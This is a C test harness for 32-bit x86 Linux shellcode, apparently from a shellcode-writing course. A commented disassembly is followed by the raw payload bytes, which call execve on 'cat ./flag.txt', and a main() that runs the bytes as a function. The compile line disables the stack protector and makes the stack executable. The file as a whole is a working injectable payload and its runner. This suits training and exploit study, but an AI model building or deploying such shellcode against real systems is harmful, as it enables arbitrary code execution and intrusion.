/*

// Author: Cameron, James
// Compile With: gcc test.c -fno-stack-protector -z execstack
// Tested On: Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
//            Ubuntu 12.04.4 LTS

slae@ubuntu:~/Documents/github/shellcode/execve-cat-flag_Stack$ objdump -M intel -d ./execve-cat-flag_Stack

./execve-cat-flag_Stack:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       31 c0                   xor    eax,eax
 8048062:       50                      push   eax
 8048063:       89 e2                   mov    edx,esp
 8048065:       68 44 44 44 44          push   0x44444444
 804806a:       68 43 43 43 43          push   0x43434343
 804806f:       89 e1                   mov    ecx,esp
 8048071:       68 74 78 74 42          push   0x42747874
 8048076:       68 6c 61 67 2e          push   0x2e67616c
 804807b:       68 2e 2f 2f 66          push   0x662f2f2e
 8048080:       88 44 24 0b             mov    BYTE PTR [esp+0xb],al
 8048084:       89 64 24 10             mov    DWORD PTR [esp+0x10],esp
 8048088:       68 63 61 74 41          push   0x41746163
 804808d:       68 62 69 6e 2f          push   0x2f6e6962
 8048092:       68 2f 2f 2f 2f          push   0x2f2f2f2f
 8048097:       88 44 24 0b             mov    BYTE PTR [esp+0xb],al
 804809b:       89 64 24 18             mov    DWORD PTR [esp+0x18],esp
 804809f:       b0 0b                   mov    al,0xb
 80480a1:       89 e3                   mov    ebx,esp
 80480a3:       cd 80                   int    0x80

*/

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
"\x31\xc0\x50\x89\xe2\x68\x44\x44\x44\x44\x68\x43\x43\x43\x43\x89\xe1\x68\x74\x78\x74\x42\x68\x6c\x61\x67\x2e\x68\x2e\x2f\x2f\x66\x88\x44\x24\x0b\x89\x64\x24\x10\x68\x63\x61\x74\x41\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x88\x44\x24\x0b\x89\x64\x24\x18\xb0\x0b\x89\xe3\xcd\x80";

int main(){

	printf("[*]Executing shellcode of length: %d\n", strlen(shellcode));
	int (*run)() = (int(*)())shellcode;
	run();
	return 0;

}
